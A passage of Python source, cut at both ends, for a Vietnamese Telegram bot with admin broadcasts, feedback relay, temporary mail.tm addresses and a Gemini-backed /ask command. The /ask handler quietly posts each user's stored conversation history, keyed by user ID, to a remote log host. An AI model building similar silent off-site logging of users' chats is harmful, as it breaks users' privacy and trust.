    logging.info(f"Received /tuongtac from user {message.from_user.id} in chat {message.chat.id}") # Thêm log
    sync_chat_to_server(message.chat)
    
    with interaction_count_lock: # Đọc biến được bảo vệ
        current_interaction_count = interaction_count

    reply_text = (
        f"<b>📊 THỐNG KÊ ZPROJECT BOT</b>\n\n"
        f"● Tổng Thống Kê Zproject Bot.\n\n"
        f"<b>Tổng số lượt tương tác:</b> <code>{current_interaction_count}</code>\n"
        f"<i>Lưu ý: Số Lượt Tương Tác Càng Cao Chứng Tỏ Độ Uy Tín Của Bot 🎉.</i>"
    )
    
    send_message_robustly(
        chat_id=message.chat.id,
        photo=TUONGTAC_IMAGE_URL,
        caption=reply_text,
        parse_mode="HTML",
        reply_to_message_id=message.message_id
    )
# Thêm vào phần Biến toàn cục và các Lock
# ... (giữ nguyên các lock cũ) ...
noti_states_lock = threading.Lock() # Thêm lock mới cho bot.noti_states
bot.noti_states = {} # Lưu trạng thái tạo thông báo của admin

# ... (các hàm khác) ...

@bot.message_handler(commands=["noti"])
@increment_interaction_count
def send_noti(message):
    """Xử lý lệnh /noti, cho phép Admin gửi thông báo kèm ảnh (tùy chọn) tới tất cả người dùng/nhóm."""
    logging.info(f"Received /noti from user {message.from_user.id} in chat {message.chat.id}") # Thêm log
    if message.from_user.id != ADMIN_ID:
        return send_message_robustly(message.chat.id, text="🚫 Bạn không có quyền sử dụng lệnh này.", parse_mode="HTML", reply_to_message_id=message.message_id)

    text = message.text.replace("/noti", "").strip()

    photo_file_id = None
    if message.reply_to_message and message.reply_to_message.photo:
        photo_file_id = message.reply_to_message.photo[-1].file_id

    if not text and not photo_file_id:
        return send_message_robustly(message.chat.id, text="⚠️ Sử dụng: <code>/noti &lt;nội dung&gt;</code> hoặc reply vào ảnh và dùng <code>/noti &lt;nội dung&gt;</code>.", parse_mode="HTML", reply_to_message_id=message.message_id)

    notify_caption = f"<b>[!] THÔNG BÁO TỪ ADMIN DEPZAI CUTO</b>\n\n{text}\n\n<i>Gửi Bởi Admin @Zproject2</i>" if text else "<b>[!] THÔNG BÁO</b>"

    with noti_states_lock: # Bảo vệ truy cập bot.noti_states
        bot.noti_states[message.chat.id] = {
            'caption': notify_caption,
            'photo_file_id': photo_file_id,
            'original_message_id': message.message_id, # Lưu ID tin nhắn gốc để reply
            'button_text': None,
            'button_url': None
        }

    markup = InlineKeyboardMarkup()
    markup.add(
        InlineKeyboardButton("✅ Có", callback_data="noti_add_button|yes"),
        InlineKeyboardButton("❌ Không", callback_data="noti_add_button|no")
    )

    send_message_robustly(
        message.chat.id,
        text="Bạn có muốn thêm nút (button) vào thông báo này không?",
        reply_markup=markup,
        parse_mode="HTML",
        reply_to_message_id=message.message_id
    )

@bot.callback_query_handler(func=lambda call: call.data.startswith("noti_add_button|"))
def noti_add_button(call):
    """Xử lý việc admin chọn thêm nút vào thông báo."""
    user_id = call.message.chat.id
    
    # Đảm bảo chỉ admin mới có thể dùng nút này
    if user_id != ADMIN_ID:
        bot.answer_callback_query(call.id, "🚫 Bạn không có quyền sử dụng nút này.", show_alert=True)
        return

    _, choice = call.data.split("|")

    with noti_states_lock:
        noti_info = bot.noti_states.get(user_id)

    if not noti_info:
        bot.answer_callback_query(call.id, "Đã xảy ra lỗi hoặc phiên làm việc đã hết. Vui lòng thử lại lệnh /noti.", show_alert=True)
        return

    if choice == "yes":
        bot.answer_callback_query(call.id, "Bạn đã chọn thêm nút.", show_alert=False)
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="Tuyệt vời! Hãy gửi cho tôi **tên của nút** bạn muốn hiển thị (ví dụ: `Tham gia nhóm`).",
            parse_mode="HTML"
        )
        # Đặt bước tiếp theo là chờ tên nút
        bot.register_next_step_handler(call.message, process_button_text)
    else: # choice == "no"
        bot.answer_callback_query(call.id, "Bạn đã chọn không thêm nút.", show_alert=False)
        bot.edit_message_text(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            text="Đang gửi thông báo...",
            parse_mode="HTML"
        )
        # Gửi thông báo ngay lập tức
        send_final_notification(user_id)


def process_button_text(message):
    """Xử lý tên nút được admin gửi."""
    user_id = message.chat.id
    with noti_states_lock:
        noti_info = bot.noti_states.get(user_id)

    if not noti_info:
        send_message_robustly(user_id, "Đã xảy ra lỗi hoặc phiên làm việc đã hết. Vui lòng thử lại lệnh /noti.", parse_mode="HTML")
        return

    button_text = message.text.strip()
    if not button_text:
        send_message_robustly(user_id, "⚠️ Tên nút không được để trống. Vui lòng gửi lại tên nút.", parse_mode="HTML", reply_to_message_id=message.message_id)
        bot.register_next_step_handler(message, process_button_text)
        return

    with noti_states_lock:
        noti_info['button_text'] = button_text
        bot.noti_states[user_id] = noti_info # Cập nhật lại state

    send_message_robustly(
        user_id,
        f"Đã lưu tên nút: <b>{html_escape(button_text)}</b>. Bây giờ hãy gửi cho tôi **URL** mà nút sẽ dẫn đến (ví dụ: `https://t.me/zproject3`).",
        parse_mode="HTML",
        reply_to_message_id=message.message_id
    )
    # Đặt bước tiếp theo là chờ URL
    bot.register_next_step_handler(message, process_button_url)


def process_button_url(message):
    """Xử lý URL của nút được admin gửi và gửi thông báo cuối cùng."""
    user_id = message.chat.id
    with noti_states_lock:
        noti_info = bot.noti_states.get(user_id)

    if not noti_info:
        send_message_robustly(user_id, "Đã xảy ra lỗi hoặc phiên làm việc đã hết. Vui lòng thử lại lệnh /noti.", parse_mode="HTML")
        return

    button_url = message.text.strip()
    if not button_url or not (button_url.startswith("http://") or button_url.startswith("https://")):
        send_message_robustly(user_id, "⚠️ URL không hợp lệ. Vui lòng gửi lại một URL đầy đủ (ví dụ: `https://t.me/zproject3`).", parse_mode="HTML", reply_to_message_id=message.message_id)
        bot.register_next_step_handler(message, process_button_url)
        return

    with noti_states_lock:
        noti_info['button_url'] = button_url
        bot.noti_states[user_id] = noti_info # Cập nhật lại state

    send_message_robustly(
        user_id,
        "Đã lưu URL. Đang tiến hành gửi thông báo...",
        parse_mode="HTML",
        reply_to_message_id=message.message_id
    )

    send_final_notification(user_id)


def send_final_notification(admin_id):
    """Hàm thực hiện gửi thông báo cuối cùng tới tất cả người nhận."""
    with noti_states_lock:
        noti_info = bot.noti_states.pop(admin_id, None) # Lấy và xóa state

    if not noti_info:
        send_message_robustly(admin_id, "Đã xảy ra lỗi khi gửi thông báo. Thông tin không tồn tại.", parse_mode="HTML")
        return

    notify_caption = noti_info['caption']
    photo_file_id = noti_info['photo_file_id']
    button_text = noti_info['button_text']
    button_url = noti_info['button_url']
    original_message_id = noti_info['original_message_id']

    markup = None
    if button_text and button_url:
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton(button_text, url=button_url))

    ok_users_count, ok_groups_count = 0, 0
    failed_count = 0
    failed_details = [] # Lưu chi tiết lỗi (ID, username/title, lỗi)
    
    with user_group_info_lock: # Đọc biến được bảo vệ
        all_users = list(USER_IDS)
        all_groups = list(GROUP_INFOS)

    # Gửi tới tất cả người dùng
    for uid in all_users:
        try:
            if photo_file_id:
                bot.send_photo(
                    chat_id=uid,
                    photo=photo_file_id,
                    caption=notify_caption,
                    parse_mode="HTML",
                    reply_markup=markup
                )
            else:
                bot.send_message(
                    chat_id=uid,
                    text=notify_caption,
                    parse_mode="HTML",
                    disable_web_page_preview=True,
                    reply_markup=markup
                )
            ok_users_count += 1
            time.sleep(0.1)
        except Exception as e:
            failed_count += 1
            failed_details.append(f"Người dùng ID: <code>{uid}</code> (Lỗi: {html_escape(str(e))})")
            logging.error(f"Failed to send notification to user {uid}: {e}")

    # Gửi tới tất cả nhóm
    for group in all_groups:
        group_id = group["id"]
        group_title = group.get("title", "Không rõ tên nhóm")
        group_username = group.get("username", "") # Có thể không có username
        
        try:
            if photo_file_id:
                bot.send_photo(
                    chat_id=group_id,
                    photo=photo_file_id,
                    caption=notify_caption,
                    parse_mode="HTML",
                    reply_markup=markup
                )
            else:
                bot.send_message(
                    chat_id=group_id,
                    text=notify_caption,
                    parse_mode="HTML",
                    disable_web_page_preview=True,
                    reply_markup=markup
                )
            ok_groups_count += 1
            time.sleep(0.1)
        except Exception as e:
            failed_count += 1
            group_display = f"{group_title} (ID: <code>{group_id}</code>)"
            if group_username:
                group_display += f" (@{group_username})"
            failed_details.append(f"Nhóm: {group_display} (Lỗi: {html_escape(str(e))})")
            logging.error(f"Failed to send notification to group {group_id}: {e}")

    total_sent = ok_users_count + ok_groups_count
    
    result_text = (
        f"✅ Gửi thành công: {total_sent} tin nhắn (Đến <b>{ok_users_count}</b> người dùng và <b>{ok_groups_count}</b> nhóm).\n"
        f"❌ Gửi thất bại: {failed_count} tin nhắn.\n\n"
    )

    if failed_count > 0:
        result_text += "<b>⚠️ Chi tiết thất bại:</b>\n"
        for detail in failed_details:
            result_text += f"- {detail}\n"
    else:
        result_text += "🎉 Tất cả thông báo đã được gửi thành công!"

    send_message_robustly(
        admin_id,
        text=result_text,
        parse_mode="HTML",
        reply_to_message_id=original_message_id # Reply về tin nhắn /noti gốc
    )


@bot.message_handler(commands=["phanhoi"])
@increment_interaction_count
def send_feedback_to_admin(message):
    """Xử lý lệnh /phanhoi, cho phép người dùng gửi phản hồi đến admin."""
    logging.info(f"Received /phanhoi from user {message.from_user.id} in chat {message.chat.id}") # Thêm log
    sync_chat_to_server(message.chat)
    feedback_text = message.text.replace("/phanhoi", "").strip()

    if not feedback_text:
        return send_message_robustly(message.chat.id, text="⚠️ Vui lòng nhập nội dung phản hồi. Ví dụ: <code>/phanhoi Bot bị lỗi ở lệnh /ask</code>", parse_mode="HTML", reply_to_message_id=message.message_id)

    user_info_for_admin = f"<a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a>"
    if message.from_user.last_name:
        user_info_for_admin += f" {message.from_user.last_name}"
    if message.from_user.username:
        user_info_for_admin += f" (@{message.from_user.username})"
    user_info_for_admin += f" (<code>{message.from_user.id}</code>)"

    chat_info_for_admin = f"ID Chat: <code>{message.chat.id}</code>\n" \
                          f"Loại Chat: {message.chat.type}"
    if message.chat.type in ["group", "supergroup"]:
        chat_info_for_admin += f"\nTên Chat: {message.chat.title}"

    timestamp = datetime.now().strftime("%H:%M:%S ngày %d/%m/%Y")

    admin_notification = (
        f"<b>📧 PHẢN HỒI MỚI TỪ NGƯỜI DÙNG</b>\n\n"
        f"<b>Người gửi:</b>\n{user_info_for_admin}\n"
        f"<b>Thông tin Chat:</b>\n{chat_info_for_admin}\n"
        f"<b>Thời gian:</b> <code>{timestamp}</code>\n\n"
        f"<b>Nội dung phản hồi:</b>\n<blockquote>{html_escape(feedback_text)}</blockquote>\n\n"
        f"<i>Để phản hồi lại người dùng này, hãy reply tin nhắn này và dùng lệnh <code>/adminph &lt;nội dung phản hồi&gt;</code></i>"
    )

    try:
        sent_message_to_admin = bot.send_message(
            chat_id=ADMIN_ID,
            text=admin_notification,
            parse_mode="HTML",
            disable_web_page_preview=True
        )
        with feedback_messages_lock: # Bảo vệ truy cập bot.feedback_messages
            bot.feedback_messages[sent_message_to_admin.message_id] = {
                'chat_id': message.chat.id,
                'user_id': message.from_user.id,
                'user_first_name': message.from_user.first_name,
                'feedback_text': feedback_text
            }
        
        send_message_robustly(message.chat.id, text="✅ Cảm ơn bạn đã gửi phản hồi! Admin sẽ xem xét sớm nhất có thể.", parse_mode="HTML", reply_to_message_id=message.message_id)
    except Exception as e:
        logging.error(f"Lỗi khi gửi phản hồi đến admin: {e}")
        send_message_robustly(message.chat.id, text="❌ Đã xảy ra lỗi khi gửi phản hồi. Vui lòng thử lại sau.", parse_mode="HTML", reply_to_message_id=message.message_id)

@bot.message_handler(commands=["adminph"])
@increment_interaction_count
def admin_reply_to_feedback(message):
    """Xử lý lệnh /adminph, cho phép admin phản hồi lại người dùng đã gửi feedback."""
    logging.info(f"Received /adminph from user {message.from_user.id} in chat {message.chat.id}") # Thêm log
    if message.from_user.id != ADMIN_ID:
        return send_message_robustly(message.chat.id, text="🚫 Bạn không có quyền sử dụng lệnh này.", parse_mode="HTML", reply_to_message_id=message.message_id)

    if not message.reply_to_message:
        return send_message_robustly(message.chat.id, text="⚠️ Bạn cần reply vào tin nhắn phản hồi của người dùng để sử dụng lệnh này.", parse_mode="HTML", reply_to_message_id=message.message_id)

    original_feedback_message_id = message.reply_to_message.message_id
    with feedback_messages_lock: # Bảo vệ truy cập bot.feedback_messages
        feedback_data = bot.feedback_messages.get(original_feedback_message_id)

    if not feedback_data:
        return send_message_robustly(message.chat.id, text="❌ Không tìm thấy thông tin chat của người dùng này. Có thể tin nhắn quá cũ hoặc bot đã khởi động lại.", parse_mode="HTML", reply_to_message_id=message.message_id)

    user_chat_id = feedback_data['chat_id']
    user_id_to_tag = feedback_data['user_id']
    user_name_to_tag = feedback_data['user_first_name']
    original_feedback_text = feedback_data['feedback_text']

    admin_response_text = message.text.replace("/adminph", "").strip()

    if not admin_response_text:
        return send_message_robustly(message.chat.id, text="⚠️ Vui lòng nhập nội dung phản hồi của admin. Ví dụ: <code>/adminph Cảm ơn bạn, chúng tôi đã khắc phục lỗi.</code>", parse_mode="HTML", reply_to_message_id=message.message_id)

    user_tag = f"<a href='tg://user?id={user_id_to_tag}'>{user_name_to_tag}</a>"

    admin_reply_to_user = (
        f"<b>👨‍💻 Admin đã phản hồi bạn {user_tag}!</b>\n\n"
        f"<b>Nội dung phản hồi của bạn:</b>\n"
        f"<blockquote>{html_escape(original_feedback_text)}</blockquote>\n\n"
        f"<b>Phản hồi từ Admin:</b>\n"
        f"<blockquote>{html_escape(admin_response_text)}</blockquote>\n\n"
        f"<i>Nếu bạn có thêm câu hỏi, vui lòng gửi phản hồi mới qua lệnh <code>/phanhoi</code>.</i>"
    )

    try:
        bot.send_message(
            chat_id=user_chat_id,
            text=admin_reply_to_user,
            parse_mode="HTML",
            disable_web_page_preview=True
        )
        send_message_robustly(message.chat.id, text="✅ Đã gửi phản hồi của Admin đến người dùng thành công.", parse_mode="HTML", reply_to_message_id=message.message_id)
    except Exception as e:
        logging.error(f"Lỗi khi gửi phản hồi của admin đến người dùng {user_chat_id}: {e}")
        send_message_robustly(message.chat.id, text="❌ Đã xảy ra lỗi khi gửi phản hồi của Admin đến người dùng.", parse_mode="HTML", reply_to_message_id=message.message_id)


@bot.message_handler(commands=["sever"])
@increment_interaction_count
def show_groups(message):
    """Xử lý lệnh /sever, hiển thị danh sách các nhóm bot đang tham gia (chỉ Admin)."""
    logging.info(f"Received /sever from user {message.from_user.id} in chat {message.chat.id}") # Thêm log
    if message.from_user.id != ADMIN_ID:
        return send_message_robustly(message.chat.id, text="🚫 Bạn không có quyền sử dụng lệnh này.", parse_mode="HTML", reply_to_message_id=message.message_id)
    
    with user_group_info_lock: # Đọc biến được bảo vệ
        if not GROUP_INFOS:
            return send_message_robustly(message.chat.id, text="📭 Hiện tại bot chưa có thông tin về nhóm nào.", parse_mode="HTML", reply_to_message_id=message.message_id)
        
        text = "<b>📦 Sever:</b>\n\n"
        for g in GROUP_INFOS:
            title = g.get("title", "Không rõ tên nhóm")
            link = f"https://t.me/{g.get('username')}" if g.get("username") else "⛔ Không có link mời"
            text += f"📌 <b>{title}</b>\n{link}\n\n"
    
    send_message_robustly(message.chat.id, text=text, parse_mode="HTML", disable_web_page_preview=True, reply_to_message_id=message.message_id)


# Lệnh tạo mail 10 phút
@bot.message_handler(commands=['mail10p'])
@increment_interaction_count
def handle_mail10p(message):
    logging.info(f"Received /mail10p from user {message.from_user.id} in chat {message.chat.id}") # Thêm log
    sync_chat_to_server(message.chat)
    user_id = message.chat.id
    
    # Kiểm tra xem người dùng đã có mail chưa và còn thời gian không
    with user_data_lock: # Bảo vệ truy cập user_data
        if user_id in user_data:
            elapsed_time = int(time.time() - user_data[user_id]["created_at"])
            remaining_time = 600 - elapsed_time
            if remaining_time > 0:
                minutes = remaining_time // 60
                seconds = remaining_time % 60
                
                # Gửi lại thông tin mail kèm nút "Xem Hộp Thư"
                mail_info_text = (
                    f"⚠️ Bạn đã có một mail 10 phút rồi:\n"
                    f"📧 `{user_data[user_id]['email']}`\n"
                    f"⏰ Mail này sẽ hết hạn sau {minutes} phút {seconds} giây."
                )
                markup = build_mail_buttons(user_id, 'mail_info')
                
                sent_msg = send_message_robustly(message.chat.id, 
                                                text=mail_info_text,
                                                parse_mode='Markdown',
                                                reply_markup=markup,
                                                reply_to_message_id=message.message_id)
                with mail_messages_state_lock: # Bảo vệ truy cập bot.mail_messages_state
                    if sent_msg:
                        bot.mail_messages_state[sent_msg.message_id] = {'chat_id': user_id, 'user_id': user_id, 'type': 'mail_info'}
                return
            else:
                # Nếu hết hạn nhưng chưa bị xóa, xóa nó đi
                del user_data[user_id]
                send_message_robustly(message.chat.id, "⏰ Mail 10 phút của bạn đã hết hạn, đang tạo mail mới...", parse_mode='Markdown', reply_to_message_id=message.message_id)


    email, pwd, token = create_temp_mail()

    if email:
        with user_data_lock: # Bảo vệ truy cập user_data
            user_data[user_id] = {
                "email": email,
                "password": pwd,
                "token": token,
                "created_at": time.time()
            }
        
        mail_info_text = (
            f"✅ Mail 10 phút của bạn là:\n"
            f"📧 `{email}`\n"
            f"⏰ Hết hạn sau 10 phút."
        )
        markup = build_mail_buttons(user_id, 'mail_info')
        
        sent_msg = send_message_robustly(message.chat.id, 
                                       text=mail_info_text, 
                                       parse_mode='Markdown',
                                       reply_markup=markup,
                                       reply_to_message_id=message.message_id)
        # Lưu trữ ID tin nhắn để có thể chỉnh sửa sau này
        with mail_messages_state_lock: # Bảo vệ truy cập bot.mail_messages_state
            if sent_msg:
                bot.mail_messages_state[sent_msg.message_id] = {'chat_id': user_id, 'user_id': user_id, 'type': 'mail_info'}
        
        threading.Thread(target=auto_delete_email, args=(user_id,)).start()
    else:
        send_message_robustly(message.chat.id, "❌ Không thể tạo email. Vui lòng thử lại sau!", parse_mode='Markdown', reply_to_message_id=message.message_id)


# Hàm xử lý lệnh /ping
@bot.message_handler(commands=['ping'])
def ping_command(message):
    start_time = time.time()
    
    # Gửi tin nhắn tạm thời để tính ping
    sent_message = bot.send_message(message.chat.id, "Đang Đo Ping Sever Bot...", parse_mode='HTML')
    
    end_time = time.time()
    
    # Tính toán ping (thời gian gửi và nhận tin nhắn)
    ping_ms = round((end_time - start_time) * 1000)

    # Tạo nội dung tin nhắn HTML
    html_message = f"""
<blockquote>
    <b>⚡ Ping Sever Bot hiện tại:</b> <i>{ping_ms}ms</i>
</blockquote>
"""
    # Tạo nút inline
    keyboard = types.InlineKeyboardMarkup()
    refresh_button = types.InlineKeyboardButton("♻️ Làm mới Ping", callback_data='refresh_ping')
    keyboard.add(refresh_button)

    # Chỉnh sửa tin nhắn ban đầu với thông tin ping và nút
    bot.edit_message_text(chat_id=message.chat.id, 
                          message_id=sent_message.message_id,
                          text=html_message, 
                          reply_markup=keyboard, 
                          parse_mode='HTML')

# Hàm xử lý khi nút "Làm mới Ping" được nhấn
@bot.callback_query_handler(func=lambda call: call.data == 'refresh_ping')
def refresh_ping_callback(call):
    # Báo hiệu đã nhận callback
    bot.answer_callback_query(call.id) 

    start_time = time.time()
    
    # Chỉnh sửa tin nhắn để hiển thị trạng thái "Đang làm mới"
    # Đây là một thao tác I/O, thời gian thực hiện có thể được dùng để ước lượng ping.
    bot.edit_message_text(chat_id=call.message.chat.id, 
                          message_id=call.message.message_id,
                          text="Đang làm mới ping...", 
                          parse_mode='HTML')

    end_time = time.time()
    
    ping_ms = round((end_time - start_time) * 1000)

    html_message = f"""
<blockquote>
    <b>⚡ Ping Sever Bot Hiện Tại hiện tại:</b> <i>{ping_ms}ms</i>
</blockquote>
"""
    keyboard = types.InlineKeyboardMarkup()
    refresh_button = types.InlineKeyboardButton("♻️ Làm mới Ping", callback_data='refresh_ping')
    keyboard.add(refresh_button)

    # Chỉnh sửa lại tin nhắn với thông tin ping mới và nút
    bot.edit_message_text(chat_id=call.message.chat.id, 
                          message_id=call.message.message_id,
                          text=html_message, 
                          reply_markup=keyboard, 
                          parse_mode='HTML')


# Lệnh mới để xóa mail 10 phút
@bot.message_handler(commands=['xoamail10p'])
@increment_interaction_count
def handle_xoamail10p(message):
    logging.info(f"Received /xoamail10p from user {message.from_user.id} in chat {message.chat.id}") # Thêm log
    sync_chat_to_server(message.chat)
    user_id = message.chat.id

    with user_data_lock: # Bảo vệ truy cập user_data
        if user_id in user_data:
            # Xóa tài khoản Mail.tm nếu có thể (thêm logic gọi API Mail.tm nếu có account_id)
            # Ví dụ:
            # try:
            #     account_info = user_data[user_id]
            #     if 'account_id' in account_info and 'token' in account_info:
            #         headers = {"Authorization": f"Bearer {account_info['token']}"}
            #         session.delete(f"https://api.mail.tm/accounts/{account_info['account_id']}", headers=headers)
            #         logging.info(f"Đã xóa tài khoản Mail.tm: {account_info['email']}")
            # except Exception as e:
            #     logging.error(f"Lỗi khi xóa tài khoản Mail.tm cho user {user_id}: {e}")

            del user_data[user_id]
            send_message_robustly(message.chat.id, "<i>🗑️ Mail 10 phút của bạn đã được xóa thành công!</i>", parse_mode='HTML', reply_to_message_id=message.message_id)
        else:
            send_message_robustly(message.chat.id, "<i>⚠️ Bạn không có mail 10 phút nào đang hoạt động để xóa.<i>", parse_mode='HTML', reply_to_message_id=message.message_id)


# Hàm nội bộ để lấy nội dung hộp thư và tạo markup
def _get_inbox_content(user_id):
    with user_data_lock: # Bảo vệ truy cập user_data
        info = user_data.get(user_id)

    if not info:
        return "<i>❌ Bạn chưa tạo email. Gõ /mail10p để tạo nhé!</i>", None, 'HTML'

    # Kiểm tra xem mail đã hết hạn chưa
    elapsed_time = int(time.time() - info["created_at"])
    if elapsed_time >= 600: # 10 phút
        # Lấy thông tin email trước khi xóa
        expired_mail_address = info.get('email', 'không xác định') # Dùng 'email' thay vì 'address'

        with user_data_lock: # Bảo vệ truy cập user_data khi xóa
            del user_data[user_id]
        
        reply_text = (
            f"⏰ <b>Mail <code>{expired_mail_address}</code> của bạn đã hết hạn!</b> "
            f"<blockquote>Tất cả thư của mail này sẽ bị xóa.</blockquote> "
            f"Vui lòng tạo mail mới bằng lệnh /mail10p."
        )
        return reply_text, None, 'HTML'

    headers = {
        "Authorization": f"Bearer {info['token']}"
    }

    try:
        r = session.get("https://api.mail.tm/messages", headers=headers)
        r.raise_for_status() # Kiểm tra lỗi HTTP
        messages = r.json().get("hydra:member", [])
        
        reply_text = ""
        if not messages:
            reply_text = "📭 Hộp thư của bạn hiện đang trống."
        else:
            reply_text = f"📥 Có {len(messages)} thư trong hộp thư:\n"
            for msg in messages:
                sender = msg['from']['address']
                subject = msg['subject']
                preview = msg['intro']
                
                sender_esc = html_escape(sender)
                subject_esc = html_escape(subject)
                preview_esc = html_escape(preview)

                reply_text += f"\n👤 <b>Từ:</b> <code>{sender_esc}</code>\n" \
                              f"✉️ <b>Chủ đề:</b> {subject_esc}\n" \
                              f"📝 <b>Nội dung:</b> {preview_esc}\n"
        
        markup = build_mail_buttons(user_id, 'inbox')
        return reply_text, markup, 'HTML'

    except Exception as e:
        logging.error(f"Lỗi khi kiểm tra hộp thư Mail.tm cho user {user_id}: {e}")
        return "❌ Lỗi khi kiểm tra hộp thư. Vui lòng thử lại sau.", None, 'Markdown'


# Lệnh kiểm tra hộp thư (vẫn giữ để dùng lệnh /hopthu)
@bot.message_handler(commands=['hopthu'])
@increment_interaction_count
def handle_hopthu(message):
    logging.info(f"Received /hopthu from user {message.from_user.id} in chat {message.chat.id}") # Thêm log
    sync_chat_to_server(message.chat)
    user_id = message.chat.id
    
    text, markup, parse_mode = _get_inbox_content(user_id)
    sent_msg = send_message_robustly(message.chat.id, 
                                   text=text, 
                                   parse_mode=parse_mode, 
                                   reply_markup=markup,
                                   reply_to_message_id=message.message_id)
    with mail_messages_state_lock: # Bảo vệ truy cập bot.mail_messages_state
        if sent_msg:
            # Nếu gửi tin nhắn mới, lưu trạng thái là inbox
            bot.mail_messages_state[sent_msg.message_id] = {'chat_id': user_id, 'user_id': user_id, 'type': 'inbox'}


# Hàm mới để định dạng đầu ra AI
def format_ai_response_html(text):
    """
    Phân tích văn bản từ AI, tách code block và văn bản thông thường,
    sau đó định dạng chúng với HTML cho Telegram, đặc biệt là thẻ <code>.
    Trả về danh sách các phần (text hoặc code) để xử lý.
    """
    parts = []
    # Regex để tìm kiếm các block code Markdown (```language\ncode\n```)
    code_blocks = re.split(r"```(?:\w+)?\n(.*?)```", text, flags=re.DOTALL)

    for i, part in enumerate(code_blocks):
        if i % 2 == 0:  # Phần văn bản (hoặc phần trước code đầu tiên, hoặc sau code cuối cùng)
            if part:
                parts.append({"type": "text", "content": html_escape(part.strip()), "raw_content": part.strip()})
        else:  # Phần code (là nội dung của group 1 từ regex)
            if part:
                formatted_code = f"<code>{html_escape(part.strip())}</code>"
                parts.append({"type": "code", "content": formatted_code, "raw_content": part.strip()})
    return parts


@bot.callback_query_handler(func=lambda call: call.data.startswith("copycode|"))
def copy_code_button(call):
    """Xử lý nút 'Copy Code'."""
    try:
        _, code_id = call.data.split("|", 1)
        with code_snippets_lock: # Bảo vệ truy cập bot.code_snippets
            code_content = bot.code_snippets.get(code_id)

        if code_content:
            bot.answer_callback_query(call.id, text="Đã sao chép nội dung code!", show_alert=True)
            try:
                bot.send_message(
                    chat_id=call.message.chat.id,
                    text=f"```\n{code_content}\n```",
                    parse_mode="MarkdownV2",
                    reply_to_message_id=call.message.message_id
                )
            except telebot.apihelper.ApiTelegramException as e:
                logging.warning(f"Failed to send code snippet for copy to chat {call.message.chat.id}: {e}. Sending plain text.")
                bot.send_message(
                    chat_id=call.message.chat.id,
                    text=f"Bạn có thể sao chép đoạn code này:\n\n{code_content}",
                    reply_to_message_id=call.message.message_id
                )
        else:
            bot.answer_callback_query(call.id, text="Lỗi: Không tìm thấy nội dung code này.", show_alert=True)
    except Exception as e:
        logging.error(f"Lỗi khi xử lý nút copy code: {e}")
        bot.answer_callback_query(call.id, text="Đã xảy ra lỗi khi sao chép code.", show_alert=True)


@bot.message_handler(commands=["ask"])
@increment_interaction_count
def ask_command(message):
    """Xử lý lệnh /ask để gửi câu hỏi đến Gemini AI. Hỗ trợ hỏi kèm ảnh."""
    logging.info(f"Received /ask from user {message.from_user.id} in chat {message.chat.id}") # Thêm log
    sync_chat_to_server(message.chat)
    prompt = message.text.replace("/ask", "").strip()
    if not prompt:
        return send_message_robustly(message.chat.id, text="❓ Bạn chưa nhập câu hỏi rồi đó! Vui lòng gõ <code>/ask &lt;câu hỏi của bạn&gt;</code>.", parse_mode="HTML", reply_to_message_id=message.message_id)

    try:
        msg_status = bot.send_message(message.chat.id, "🤖", reply_to_message_id=message.message_id)
    except telebot.apihelper.ApiTelegramException as e:
        logging.warning(f"Failed to send initial 'thinking' message in chat {message.chat.id}: {e}. Proceeding without reply_to.")
        msg_status = bot.send_message(message.chat.id, "🤖")

    user_id = message.from_user.id
    user_name = message.from_user.first_name
    memory = load_user_memory(user_id)

    try:
        prompt_data = session.get(REMOTE_PROMPT_URL, timeout=DEFAULT_TIMEOUT_GLOBAL).json()
        system_prompt = prompt_data.get("prompt", "Bạn là AI thông minh và hữu ích.")
    except Exception as e:
        logging.error(f"Lỗi tải prompt từ xa: {e}")
        system_prompt = "Bạn là AI thông minh và hữu ích."

    history_block = ""
    if memory:
        for item in memory[-5:]:
            history_block += f"Người dùng hỏi: {item['question']}\nAI: {item['answer']}\n"

    full_prompt = f"{system_prompt}\n\n[Ngữ cảnh trước đó với {user_name}]\n{history_block}\nNgười dùng hiện tại hỏi: {prompt}"

    headers = {"Content-Type": "application/json"}
    parts = [{"text": full_prompt}]
    image_attached = False

    if message.reply_to_message and message.reply_to_message.photo:
        try:
            photo = message.reply_to_message.photo[-1]
            file_info = bot.get_file(photo.file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            image = Image.open(BytesIO(downloaded_file))
            buffer = BytesIO()
            if image.mode in ("RGBA", "P"):
                image = image.convert("RGB")
            image.save(buffer, format="JPEG")
            base64_img = base64.b64encode(buffer.getvalue()).decode()
            parts.insert(0, {
                "inline_data": {
                    "mime_type": "image/jpeg",
                    "data": base64_img
                }
            })
            image_attached = True
        except Exception as e:
            logging.error(f"Lỗi xử lý ảnh đính kèm: {e}")

    data = {"contents": [{"parts": parts}]}
    try:
        res = session.post(GEMINI_URL, headers=headers, json=data, timeout=DEFAULT_TIMEOUT_GLOBAL)
        res.raise_for_status()
        result = res.json()["candidates"][0]["content"]["parts"][0]["text"]
    except Exception as e:
        try:
            bot.edit_message_text(
                f"❌ Đã xảy ra lỗi khi gọi API Gemini:\n<pre>{html_escape(str(e))}</pre>",
                msg_status.chat.id,
                msg_status.message_id,
                parse_mode="HTML"
            )
        except telebot.apihelper.ApiTelegramException as edit_e:
            logging.warning(f"Failed to edit message {msg_status.message_id}: {edit_e}. Sending new error message.")
            send_message_robustly(message.chat.id, text=f"❌ Đã xảy ra lỗi khi gọi API Gemini:\n<pre>{html_escape(str(e))}</pre>", parse_mode="HTML")
        return

    entry = {
        "question": prompt,
        "answer": result,
        "created": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "with_image": image_attached,
        "name": message.from_user.first_name
    }
    memory.append(entry)
    save_user_memory(user_id, memory)

    try:
        session.post(
            f"{REMOTE_LOG_HOST}?uid={user_id}",
            data=json.dumps(memory, ensure_ascii=False),
            headers={"Content-Type": "application/json"},
            timeout=DEFAULT_TIMEOUT_GLOBAL
        )
    except Exception as e:
        logging.error(f"Lỗi gửi log từ xa: {e}")

    # --- Xử lý định dạng và gửi tin nhắn ---
    response_parts_structured = format_ai_response_html(result)
    reply_id = uuid.uuid4().hex[:6]
    
    with voice_map_lock: # Bảo vệ truy cập bot.voice_map
